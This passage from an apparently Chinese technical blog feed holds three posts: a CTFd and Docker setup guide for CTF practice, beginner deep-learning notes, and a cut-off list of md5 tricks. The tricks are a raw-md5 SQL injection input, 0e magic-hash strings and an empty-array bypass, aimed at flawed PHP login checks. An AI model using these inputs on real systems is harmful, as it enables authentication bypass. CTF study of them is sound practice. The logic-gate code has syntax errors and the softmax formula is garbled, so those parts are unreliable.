Pull complete</span><br><span class="line">8a05be3688e0: Pull complete</span><br><span class="line">c09ffdc1b660: Pull complete</span><br><span class="line">2eb7fe288fc8: Pull complete</span><br><span class="line">b41d1cc4d40f: Pull complete</span><br><span class="line">a92376500910: Pull complete</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>注：首次启动由于下载依赖等会比较慢</p><h2 id="平台配置"><a href="#平台配置" class="headerlink" title="平台配置"></a>平台配置</h2><p>打开浏览器，输入127.0.0.1:8000配置赛事相关信息</p><p><img src="https://www.helloimg.com/images/2021/11/28/GFgMuY.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/28/GFgMuY.png" srcset="data:image/png;base64,666" alt="GFgMuY.png"></p><p><img src="https://www.helloimg.com/images/2021/11/28/GFgTJ9.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/28/GFgTJ9.png" srcset="data:image/png;base64,666" alt="GFgTJ9.png"></p><p><img src="https://www.helloimg.com/images/2021/11/28/GFgWcX.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/28/GFgWcX.png" srcset="data:image/png;base64,666" alt="GFgWcX.png"></p><h2 id="添加题目"><a href="#添加题目" class="headerlink" title="添加题目"></a>添加题目</h2><p>在GitHub上找题目，clone到本地</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/var/www/html/CTFd/ctf_training]</span><br><span class="line">└─$ sudo git <span class="built_in">clone</span> https://github.com/CTFTraining/CTFTraining.git</span><br><span class="line">Cloning into <span class="string">&#x27;CTFTraining&#x27;</span>...</span><br><span class="line">remote: Enumerating objects: 86, <span class="keyword">done</span>.</span><br><span class="line">remote: Total 86 (delta 0), reused 0 (delta 0), pack-reused 86</span><br><span class="line">Receiving objects: 100% (86/86), 31.72 KiB | 331.00 KiB/s, <span class="keyword">done</span>.</span><br><span class="line">Resolving deltas: 100% (48/48), <span class="keyword">done</span>.</span><br></pre></td></tr></table></figure><p>实际测试发现不能把所有的题目都clone下来，就先试一道题</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/var/www/html/CTFd/ctf_training]</span><br><span class="line">└─$ sudo git <span class="built_in">clone</span> https://github.com/CTFTraining/0ctf_2016_unserialize.git                                                                                                 128 ⨯</span><br><span class="line">Cloning into <span class="string">&#x27;0ctf_2016_unserialize&#x27;</span>...</span><br><span class="line">remote: Enumerating objects: 32, <span class="keyword">done</span>.</span><br><span class="line">remote: Total 32 (delta 0), reused 0 (delta 0), pack-reused 32</span><br><span class="line">Receiving objects: 100% (32/32), 779.15 KiB | 2.07 MiB/s, <span class="keyword">done</span>.</span><br><span class="line">Resolving deltas: 100% (3/3), <span class="keyword">done</span>.</span><br></pre></td></tr></table></figure><p>docker images 命令查看已有镜像</p><p>docker build ./ -t [镜像名称] 启动Dockerfile文件，创建镜像</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/var/…/html/CTFd/ctf_training/0ctf_2016_unserialize]</span><br><span class="line">└─$ sudo docker build ./ -t 0ctf_2016_unserialize                     </span><br><span class="line">Sending build context to Docker daemon  1.841MB</span><br><span class="line">Step 1/8 : FROM php:5.6-fpm-alpine</span><br><span class="line">5.6-fpm-alpine: Pulling from library/php</span><br><span class="line">169185f82c45: Pull complete </span><br><span class="line">8ba0d98519aa: Pull complete </span><br><span class="line">75f762bbc102: Pull complete </span><br><span class="line">04f939cd9fe5: Pull complete </span><br><span class="line">5feedbe48aa1: Pull complete </span><br><span class="line">47e0f87348c0: Pull complete </span><br><span class="line">68b7fb9d3c14: Pull complete </span><br><span class="line">7e4b086d6b5d: Pull complete </span><br><span class="line">a15e624700d4: Pull complete </span><br><span class="line">f714654cc532: Pull complete </span><br><span class="line">Digest: sha256:e3845c650c700234be3fb5b94865753d1a4534f8820d4dea1d0ee6d875efe02b</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/var/…/html/CTFd/ctf_training/0ctf_2016_unserialize]</span><br><span class="line">└─$ sudo docker images                                                                                                                                                        1 ⨯</span><br><span class="line">REPOSITORY              TAG               IMAGE ID       CREATED          SIZE</span><br><span class="line">0ctf_2016_unserialize   latest            931233916db0   2 minutes ago    333MB</span><br><span class="line">ctfd_ctfd               latest            b36ee26f2439   49 minutes ago   791MB</span><br><span class="line">python                  3.7-slim-buster   cd7d26aa86ac   10 days ago      113MB</span><br><span class="line">nginx                   1.17              9beeba249f3e   18 months ago    127MB</span><br><span class="line">mariadb                 10.4.12           b6184b68d1fd   19 months ago    357MB</span><br><span class="line">redis                   4                 191c4017dcdd   19 months ago    89.3MB</span><br><span class="line">ubuntu                  18.10             9dc19675e327   2 years ago      67.3MB</span><br><span class="line">php                     5.6-fpm-alpine    6feac8f2ef42   2 years ago      54.5MB</span><br><span class="line">php                     5-apache-jessie   d34f09f63596   2 years ago      374MB</span><br></pre></td></tr></table></figure><p>再通过镜像创建容器：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/var/…/html/CTFd/ctf_training/0ctf_2016_unserialize]</span><br><span class="line">└─$ sudo docker run --name 0ctf_2016_unserialize -p 20000:80 -d 0ctf_2016_unserialize</span><br></pre></td></tr></table></figure><p>查看现有容器：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/var/…/html/CTFd/ctf_training/0ctf_2016_unserialize]</span><br><span class="line">└─$ sudo docker ps                                                                   </span><br><span class="line">CONTAINER ID   IMAGE                   COMMAND                  CREATED          STATUS          PORTS                                               NAMES</span><br><span class="line">9cae78cf79bc   0ctf_2016_unserialize   <span class="string">&quot;docker-php-entrypoi…&quot;</span>   5 seconds ago    Up 4 seconds    9000/tcp, 0.0.0.0:20000-&gt;80/tcp, :::20000-&gt;80/tcp   0ctf_2016_unserialize</span><br><span class="line">3b3889db12c7   nginx:1.17              <span class="string">&quot;nginx -g &#x27;daemon of…&quot;</span>   57 minutes ago   Up 57 minutes   0.0.0.0:80-&gt;80/tcp, :::80-&gt;80/tcp                   ctfd_nginx_1</span><br><span class="line">7b58b9661715   ctfd_ctfd               <span class="string">&quot;/opt/CTFd/docker-en…&quot;</span>   57 minutes ago   Up 57 minutes   0.0.0.0:8000-&gt;8000/tcp, :::8000-&gt;8000/tcp           ctfd_ctfd_1</span><br><span class="line">93e49564bff7   mariadb:10.4.12         <span class="string">&quot;docker-entrypoint.s…&quot;</span>   57 minutes ago   Up 57 minutes                                                       ctfd_db_1</span><br><span class="line">9f4380eb4639   redis:4                 <span class="string">&quot;docker-entrypoint.s…&quot;</span>   57 minutes ago   Up 57 minutes</span><br></pre></td></tr></table></figure><p>访问127.0.0.1:20000即可访问到刚刚添加的题目，20000是刚刚指定的端口</p><p><a href="https://www.helloimg.com/image/GFrlx9"><img src="https://www.helloimg.com/images/2021/11/28/GFrlx9.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/28/GFrlx9.png" srcset="data:image/png;base64,666" alt="GFrlx9.png"></a></p><p>打开题目容器：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -i -t &lt;container&gt; /bin/sh</span><br></pre></td></tr></table></figure><p>为题目添加flag：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/var/…/html/CTFd/ctf_training/0ctf_2016_unserialize]</span><br><span class="line">└─$ sudo docker <span class="built_in">exec</span> -i -t 0ctf_2016_unserialize /bin/sh                                                                                                                      1 ⨯</span><br><span class="line">/var/www/html <span class="comment"># ls</span></span><br><span class="line">class.php     config.php    index.php     profile.php   register.php  static        update.php    upload        www.zip</span><br><span class="line">/var/www/html <span class="comment"># echo flag&#123;an_e@sy_un5eri@li2e_chall3nge&#125; &gt; flag.txt</span></span><br><span class="line">/var/www/html <span class="comment"># ls</span></span><br><span class="line">class.php     config.php    flag.txt      index.php     profile.php   register.php  static        update.php    upload        www.zip</span><br></pre></td></tr></table></figure><p>最后在后台添加题目地址等信息<br><img src="https://www.helloimg.com/images/2021/11/28/GFVPrX.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/28/GFVPrX.png" srcset="data:image/png;base64,666" alt="GFVPrX.png"><br><img src="https://www.helloimg.com/images/2021/11/28/GFVFO9.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/28/GFVFO9.png" srcset="data:image/png;base64,666" alt="GFVFO9.png"></p><p><a href="https://www.helloimg.com/image/GFVxLn"><img src="https://www.helloimg.com/images/2021/11/28/GFVxLn.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/28/GFVxLn.png" srcset="data:image/png;base64,666" alt="GFVxLn.png"></a></p><p>同理可添加其他题目</p><h2 id="搭建中遇到的问题"><a href="#搭建中遇到的问题" class="headerlink" title="搭建中遇到的问题"></a>搭建中遇到的问题</h2><ul><li>git clone 命令克隆失败：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/var/www/html/CTFd/ctf_training]</span><br><span class="line">└─$ sudo git <span class="built_in">clone</span> https://github.com/CTFTraining/0ctf_2016_unserialize.git                                                                                                 128 ⨯</span><br><span class="line">Cloning into <span class="string">&#x27;0ctf_2016_unserialize&#x27;</span>...</span><br><span class="line">fatal: unable to access <span class="string">&#x27;https://github.com/CTFTraining/0ctf_2016_unserialize.git/&#x27;</span>: Failed to connect to github.com port 443: Connection refused</span><br></pre></td></tr></table></figure><p>由于网络问题，可能需要多克隆几次，实在不行可以试试把压缩包下载下来</p><ul><li><p>有些题目克隆下来可能有问题，运行过程中可能会报错（目前仍不了解是什么原因）</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/var/…/html/CTFd/ctf_training/34c3ctf_2017_urlstorage]</span><br><span class="line">└─$ sudo docker build ./ -t urlstorage                                                                                                                                        1 ⨯</span><br><span class="line">Sending build context to Docker daemon  282.6kB</span><br><span class="line">Step 1/7 : FROM ubuntu:18.10</span><br><span class="line">18.10: Pulling from library/ubuntu</span><br><span class="line">8a532469799e: Pull complete </span><br><span class="line">32f4dcec3531: Pull complete </span><br><span class="line">230f0701585e: Pull complete </span><br><span class="line">e01f70622967: Pull complete </span><br><span class="line">Digest: sha256:7d657275047118bb77b052c4c0ae43e8a289ca2879ebfa78a703c93aa8fd686c</span><br><span class="line">Status: Downloaded newer image <span class="keyword">for</span> ubuntu:18.10</span><br><span class="line"> ---&gt; 9dc19675e327</span><br><span class="line">Step 2/7 : ENV DOCKER=1 PHANTOMJS_VERSION=<span class="string">&quot;2.1.1&quot;</span></span><br><span class="line"> ---&gt; Running <span class="keyword">in</span> 98e854ac92f3</span><br><span class="line">Removing intermediate container 98e854ac92f3</span><br><span class="line"> ---&gt; 154a521cb653</span><br><span class="line">Step 3/7 : RUN sed -i <span class="string">&#x27;s/http:\/\/archive.ubuntu.com\//http:\/\/mirrors.tuna.tsinghua.edu.cn\//g&#x27;</span> /etc/apt/sources.list &amp;&amp;     sed -i <span class="string">&#x27;/security/d&#x27;</span> /etc/apt/sources.list &amp;&amp;     apt-get -y update &amp;&amp;     apt-get -yqq install curl python3 python3-pip mariadb-server libmysqlclient-dev nginx wget bzip2 libfreetype6 libfontconfig &amp;&amp;     mkdir -p /srv/var &amp;&amp;     wget --local-encoding=UTF-8 --no-check-certificate -O /tmp/phantomjs-<span class="variable">$PHANTOMJS_VERSION</span>-linux-x86_64.tar.bz2 https://bitbucket.org/ariya/phantomjs/downloads/phantomjs-<span class="variable">$PHANTOMJS_VERSION</span>-linux-x86_64.tar.bz2 &amp;&amp;     tar -xjf /tmp/phantomjs-<span class="variable">$PHANTOMJS_VERSION</span>-linux-x86_64.tar.bz2 -C /tmp &amp;&amp;     rm -f /tmp/phantomjs-<span class="variable">$PHANTOMJS_VERSION</span>-linux-x86_64.tar.bz2 &amp;&amp;     mv /tmp/phantomjs-<span class="variable">$PHANTOMJS_VERSION</span>-linux-x86_64/ /srv/var/phantomjs &amp;&amp;     ln -s /srv/var/phantomjs/bin/phantomjs /usr/bin/phantomjs &amp;&amp;     pip3 install django gunicorn mysqlclient requests lxml pyyaml django-simple-captcha</span><br><span class="line"> ---&gt; Running <span class="keyword">in</span> 8d702a730242</span><br><span class="line">Ign:1 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic InRelease</span><br><span class="line">Ign:2 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-updates InRelease</span><br><span class="line">Ign:3 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-backports InRelease</span><br><span class="line">Err:4 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic Release</span><br><span class="line">  404  Not Found [IP: 101.6.15.130 80]</span><br><span class="line">Err:5 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-updates Release</span><br><span class="line">  404  Not Found [IP: 101.6.15.130 80]</span><br><span class="line">Err:6 http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-backports Release</span><br><span class="line">  404  Not Found [IP: 101.6.15.130 80]</span><br><span class="line">Reading package lists...</span><br><span class="line">E: The repository <span class="string">&#x27;http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic Release&#x27;</span> does not have a Release file.</span><br><span class="line">E: The repository <span class="string">&#x27;http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-updates Release&#x27;</span> does not have a Release file.                                                               </span><br><span class="line">E: The repository <span class="string">&#x27;http://mirrors.tuna.tsinghua.edu.cn/ubuntu cosmic-backports Release&#x27;</span> does not have a Release file.                                                             </span><br><span class="line">The <span class="built_in">command</span> <span class="string">&#x27;/bin/sh -c sed -i &#x27;</span>s/http:\/\/archive.ubuntu.com\//http:\/\/mirrors.tuna.tsinghua.edu.cn\//g<span class="string">&#x27; /etc/apt/sources.list &amp;&amp;     sed -i &#x27;</span>/security/d<span class="string">&#x27; /etc/apt/sources.list &amp;&amp;     apt-get -y update &amp;&amp;     apt-get -yqq install curl python3 python3-pip mariadb-server libmysqlclient-dev nginx wget bzip2 libfreetype6 libfontconfig &amp;&amp;     mkdir -p /srv/var &amp;&amp;     wget --local-encoding=UTF-8 --no-check-certificate -O /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 https://bitbucket.org/ariya/phantomjs/downloads/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 &amp;&amp;     tar -xjf /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 -C /tmp &amp;&amp;     rm -f /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64.tar.bz2 &amp;&amp;     mv /tmp/phantomjs-$PHANTOMJS_VERSION-linux-x86_64/ /srv/var/phantomjs &amp;&amp;     ln -s /srv/var/phantomjs/bin/phantomjs /usr/bin/phantomjs &amp;&amp;     pip3 install django gunicorn mysqlclient requests lxml pyyaml django-simple-captcha&#x27;</span> returned a non-zero code: 100</span><br></pre></td></tr></table></figure></li><li><p>许多命令都需要root权限，如果在哪一步运行报错了可以检查以下是否是权限问题</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Deep Learning from Scratch</title>
      <link href="2021/11/28/deep_learning_from_scratch/"/>
      <url>2021/11/28/deep_learning_from_scratch/</url>
      
        <content type="html"><![CDATA[<h1 id="读书记录"><a href="#读书记录" class="headerlink" title="读书记录"></a>读书记录</h1><a id="more"></a><h2 id="收获："><a href="#收获：" class="headerlink" title="收获："></a>收获：</h2><ul><li><p>对matplotlib、numpy有了初步认识</p></li><li><p>了解了一些基础概念</p></li><li><p>跟随书本实现了简单的逻辑门电路</p></li><li><p>认识了感知机、激活函数</p></li></ul><h3 id="numpy"><a href="#numpy" class="headerlink" title="numpy:"></a>numpy:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">x = np.array([<span class="number">1.0</span>,<span class="number">2.0</span>,<span class="number">3.0</span>]) <span class="comment">#生成数组</span></span><br><span class="line">print(x)</span><br><span class="line">print(x.dtype)<span class="comment">#查看数据类型</span></span><br><span class="line">print(x.shape)<span class="comment">#查看矩阵形状</span></span><br><span class="line">x = x.flatten()<span class="comment">#将矩阵转换为一维数组</span></span><br></pre></td></tr></table></figure><h3 id="matplotlib"><a href="#matplotlib" class="headerlink" title="matplotlib"></a>matplotlib</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> matplotlib.image <span class="keyword">import</span> imread</span><br><span class="line"></span><br><span class="line">x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">y = [<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">10</span>]</span><br><span class="line">plt.plot(x, y)<span class="comment">#绘制图形</span></span><br><span class="line">plt.show()<span class="comment">#显示坐标系</span></span><br><span class="line"></span><br><span class="line">img = imread(<span class="string">&quot;lena.png&quot;</span>)</span><br><span class="line">plt.imshow(img)<span class="comment">#显示图像</span></span><br></pre></td></tr></table></figure><h3 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h3><ul>    <li>广播：将与矩阵相乘的标量转换为相应大小矩阵的功能</li>    <li>张量：一般化之后的向量或矩阵</li>    <li>感知机：感知机(perceptron)是二类分类的线性分类模型，其输入为实例的特征向量，输出为实例的类别。</li></ul><h3 id="简单逻辑门的实现"><a href="#简单逻辑门的实现" class="headerlink" title="简单逻辑门的实现"></a>简单逻辑门的实现</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AND</span>(<span class="params">x1, x2</span>):</span></span><br><span class="line">    x = np.array([x1, x2])</span><br><span class="line">    w = np.array([<span class="number">0.5</span> <span class="number">0.5</span>])</span><br><span class="line">    b = <span class="number">-0.7</span></span><br><span class="line">    tmp = np.<span class="built_in">sum</span>(w*x) + b</span><br><span class="line">    <span class="keyword">if</span> tmp  &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> tmp &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">NAND</span>(<span class="params">x1, x2</span>):</span></span><br><span class="line">    x = np.array([x1, x2])</span><br><span class="line">    w = np.array([<span class="number">-0.5</span> <span class="number">-0.5</span>])</span><br><span class="line">    b = <span class="number">0.7</span></span><br><span class="line">    tmp = np.<span class="built_in">sum</span>(w*x) + b</span><br><span class="line">    <span class="keyword">if</span> tmp  &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> tmp &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">OR</span>(<span class="params">x1, x2</span>):</span></span><br><span class="line">    x = np.array([x1, x2])</span><br><span class="line">    w = np.array([<span class="number">0.5</span> <span class="number">0.5</span>])</span><br><span class="line">    b = <span class="number">-0.2</span></span><br><span class="line">    tmp = np.<span class="built_in">sum</span>(w*x) + b</span><br><span class="line">    <span class="keyword">if</span> tmp &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> tmp &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">XOR</span>(<span class="params">x1, x2</span>):</span></span><br><span class="line">    s1 = NAND(x1, x2)</span><br><span class="line">    s2 = OR(x1, x2)</span><br><span class="line">    y = AND(s1, s2)</span><br><span class="line">    <span class="keyword">return</span> y</span><br></pre></td></tr></table></figure><h3 id="感知机"><a href="#感知机" class="headerlink" title="感知机"></a>感知机</h3><h4 id="感知机的局限性"><a href="#感知机的局限性" class="headerlink" title="感知机的局限性"></a>感知机的局限性</h4><p>​    单层感知机只能表示线性空间</p><h4 id="多层感知机的优势"><a href="#多层感知机的优势" class="headerlink" title="多层感知机的优势"></a>多层感知机的优势</h4><ul><li>多层感知机可以实现非线性空间</li><li>使用了非线性函数sigmoid作为激活函数的2层感知机可以表示任意函数</li></ul><h3 id="激活函数"><a href="#激活函数" class="headerlink" title="激活函数"></a>激活函数</h3><p>定义：将输入信号的总和转换为输出信号的函数</p><ul><li><p>sigmoid函数：<br>$$<br>h(x) = \frac{1}{(1+e^{-x})}<br>$$</p></li><li><p>阶跃函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">step_function</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">step_function</span>(<span class="params">x</span>):</span></span><br><span class="line">    y = x &gt; <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> y.astype(np.<span class="built_in">int</span>)</span><br></pre></td></tr></table></figure></li><li><p>ReLU函数<br>$$<br>h(x)=<br>\begin{cases}<br>x    (x&gt;0)\<br>0    (x\leq0)\<br>\end{cases}<br>$$</p></li></ul><ul><li><p>恒等函数</p></li><li><p>softmax函数<br>$$<br>y_k=\frac{e^}{\sum_{i=1}^ne^{a_i}}<br>$$</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 知识输出、AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>有关md5的一些信息</title>
      <link href="2021/11/23/something_about_md5/"/>
      <url>2021/11/23/something_about_md5/</url>
      
        <content type="html"><![CDATA[<p>在ctf比赛中常常见到md5的身影，对于md5，常见的利用方式有以下几种<a id="more"></a></p><h3>在sql注入中</h3><p>若遇到了类似以下的情况</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$password=$_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">$sql = <span class="string">&quot;SELECT * FROM admin WHERE username = &#x27;admin&#x27; and password = &#x27;&quot;</span>.md5($password,<span class="literal">true</span>).<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">$result=mysqli_query($link,$sql);</span><br></pre></td></tr></table></figure><p>可以传入ffifdyop或者129581926211651571912466741651878684928，这两者md5加密后的结果都包含 ‘ OR ‘ 的字样，可用于引号逃逸</p><h3>在弱类型比较中</h3><p>若存在对两个md5加密后的字符串进行比较时，可传入类似s1502113478a、s1836677006a的字符串，加密后都是以0e开头，比较时都为零</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&quot;s1502113478a&quot;</span>;</span><br><span class="line">$b = <span class="string">&quot;s1836677006a&quot;</span>;</span><br><span class="line"></span><br><span class="line">$a_1 = md5($a);</span><br><span class="line">$b_1 = md5($b);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $a_1.<span class="string">&quot;\n&quot;</span>.$b_1.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Documents]</span><br><span class="line">└─$ php md5.php </span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">0e481036490867661113260034900752</span><br></pre></td></tr></table></figure><h3>在允许传递数组时</h3><p>可以传入两个空数组，由于md5无法对数组进行加密，故返回null，而 null = null 为 true</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">array</span>();</span><br><span class="line">$b = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">$a_1 = md5($a);</span><br><span class="line">$b_1 = md5($b);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $a_1.<span class="string">&quot;\n&quot;</span>.$b_1.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Documents]</span><br><span class="line">└─$ php em_array.php </span><br><span class="line">PHP Warning:  